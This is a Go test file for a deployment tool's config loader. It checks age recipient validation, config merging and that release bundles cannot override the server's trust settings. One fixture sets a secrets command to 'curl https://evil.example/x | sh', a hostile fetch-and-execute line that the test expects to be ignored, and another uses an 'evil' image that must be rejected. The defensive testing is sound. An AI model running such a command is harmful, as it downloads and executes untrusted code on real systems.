package config

import (
	"slices"
	"strings"
	"testing"

	"filippo.io/age"
	"gopkg.in/yaml.v3"
)

func testRecipient(t *testing.T) string {
	t.Helper()
	id, err := age.GenerateX25519Identity()
	if err != nil {
		t.Fatal(err)
	}
	return id.Recipient().String()
}

func TestValidateReleaseRecipients(t *testing.T) {
	server, backup := testRecipient(t), testRecipient(t)
	tests := []struct {
		name       string
		recipients []string
		wantErr    string
	}{
		{name: "none", recipients: nil},
		{name: "server and backup", recipients: []string{server, backup}},
		{name: "ssh key", recipients: []string{"ssh-ed25519 AAAAC3Nza"}, wantErr: "release.recipients[0]"},
		{name: "malformed", recipients: []string{server, "age1abc"}, wantErr: "release.recipients[1]"},
		{name: "listed twice", recipients: []string{server, server}, wantErr: "listed twice"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := agentTestConfig(AgentConfig{})
			cfg.Release.Recipients = tt.recipients
			err := Validate(cfg)
			if tt.wantErr == "" {
				if err != nil {
					t.Fatalf("Validate() = %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
				t.Fatalf("Validate() = %v, want %q", err, tt.wantErr)
			}
		})
	}
}

func TestMergeConfigs_ReleaseRecipients(t *testing.T) {
	base := &Config{Release: ReleaseConfig{Recipients: []string{"age1base"}}}
	merge := func(destYAML string) []string {
		t.Helper()
		var dest Config
		var node yaml.Node
		if err := yaml.Unmarshal([]byte(destYAML), &dest); err != nil {
			t.Fatal(err)
		}
		if err := yaml.Unmarshal([]byte(destYAML), &node); err != nil {
			t.Fatal(err)
		}
		return mergeConfigs(base, &dest, &node).Release.Recipients
	}

	if got := merge("release:\n  recipients: [age1dest]\n"); len(got) != 1 || got[0] != "age1dest" {
		t.Fatalf("destination recipients = %v, want them to replace the base list", got)
	}
	if got := merge("release:\n  recipients: []\n"); len(got) != 0 {
		t.Fatalf("empty destination list = %v, want it to clear the base list", got)
	}
	if got := merge("service: app\n"); len(got) != 1 || got[0] != "age1base" {
		t.Fatalf("destination without release = %v, want the base list kept", got)
	}
}

const releaseServerYAML = `service: app
image: ghcr.io/acme/app
servers:
  web:
    hosts: [app-1]
proxy:
  host: app.example.com
registry:
  server: ghcr.io
  username: reader
  password: [AGENT_REGISTRY_TOKEN]
secrets_provider: file
secrets_path: .azud/agent-secrets
agent:
  source: bundle
  track: production
  verify_command: cosign verify "$$AZUD_AGENT_IMAGE"
`

func releaseServer(t *testing.T) *Config {
	t.Helper()
	cfg, _, err := parseConfigBytes([]byte(releaseServerYAML))
	if err != nil {
		t.Fatal(err)
	}
	applyDefaults(cfg)
	if err := Validate(cfg); err != nil {
		t.Fatalf("server config: %v", err)
	}
	return cfg
}

func TestFromReleaseKeepsTheServersTrustSettings(t *testing.T) {
	server := releaseServer(t)
	base := []byte(`service: app
image: ghcr.io/acme/app
servers:
  web:
    hosts: [app-1]
  worker:
    hosts: [app-1]
    cmd: bin/worker
proxy:
  host: app.example.com
registry:
  server: ghcr.io
  username: ci
  password: [GITHUB_TOKEN]
secrets_provider: command
secrets_command: curl https://evil.example/x | sh
hooks_path: /tmp/bundle-hooks
env:
  clear:
    MODE: base
  secret: [DATABASE_URL]
`)
	dest := []byte("env:\n  clear:\n    MODE: production\n")

	cfg, ignored, err := FromRelease(base, dest, server)
	if err != nil {
		t.Fatalf("FromRelease: %v", err)
	}
	if cfg.SecretsProvider != "file" || cfg.SecretsCommand != "" || cfg.HooksPath != server.HooksPath {
		t.Fatalf("trust settings from the bundle survived: provider=%q command=%q hooks=%q", cfg.SecretsProvider, cfg.SecretsCommand, cfg.HooksPath)
	}
	if cfg.Registry.Username != "reader" || !cfg.Agent.Bundles() {
		t.Fatalf("registry/agent not taken from the server: %+v %+v", cfg.Registry, cfg.Agent)
	}
	if cfg.Env.Clear["MODE"] != "production" || !cfg.HasRole("worker") {
		t.Fatalf("the bundle's own settings were not applied: env=%v roles=%v", cfg.Env.Clear, cfg.GetRoles())
	}
	for _, key := range []string{"registry", "secrets_provider", "secrets_command", "hooks_path"} {
		if !slices.Contains(ignored, key) {
			t.Errorf("ignored = %v, want %s reported", ignored, key)
		}
	}
	if slices.Contains(ignored, "agent") || slices.Contains(ignored, "ssh") {
		t.Errorf("ignored = %v; keys the bundle did not change must not be reported", ignored)
	}
}

func TestFromReleaseRejectsAnotherServiceImageOrHost(t *testing.T) {
	server := releaseServer(t)
	release := func(service, image, host string) []byte {
		return []byte("service: " + service + "\nimage: " + image + "\nservers:\n  web:\n    hosts: [" + host + "]\nproxy:\n  host: app.example.com\n")
	}
	cases := map[string][]byte{
		"service":  release("other", "ghcr.io/acme/app", "app-1"),
		"deploys":  release("app", "ghcr.io/evil/app", "app-1"),
		"not this": release("app", "ghcr.io/acme/app", "app-2"),
	}
	for want, base := range cases {
		if _, _, err := FromRelease(base, nil, server); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("FromRelease = %v, want an error about %q", err, want)
		}
	}
	if _, _, err := FromRelease(release("app", "ghcr.io/acme/app:v2", "app-1"), nil, server); err != nil {
		t.Errorf("a tagged image of the same repository = %v", err)
	}
}

func TestValidateAgentBundleSource(t *testing.T) {
	cases := []struct {
		name    string
		agent   AgentConfig
		wantErr string
	}{
		{name: "bundle", agent: AgentConfig{Track: "production", Source: "bundle", VerifyCommand: verifyImage, Identity: "/etc/azud/app.age", AllowDowngrade: true}},
		{name: "unverified bundle", agent: AgentConfig{Track: "production", Source: "bundle", InsecureSkipVerify: true}, wantErr: "not allowed with source: bundle"},
		{name: "identity without bundles", agent: AgentConfig{Track: "production", VerifyCommand: verifyImage, Identity: "/x"}, wantErr: "agent.source"},
		{name: "unknown source", agent: AgentConfig{Track: "production", VerifyCommand: verifyImage, Source: "git"}, wantErr: `not "git"`},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			err := Validate(agentTestConfig(tt.agent))
			if tt.wantErr == "" && err != nil {
				t.Fatalf("Validate() = %v", err)
			}
			if tt.wantErr != "" && (err == nil || !strings.Contains(err.Error(), tt.wantErr)) {
				t.Fatalf("Validate() = %v, want %q", err, tt.wantErr)
			}
		})
	}
}
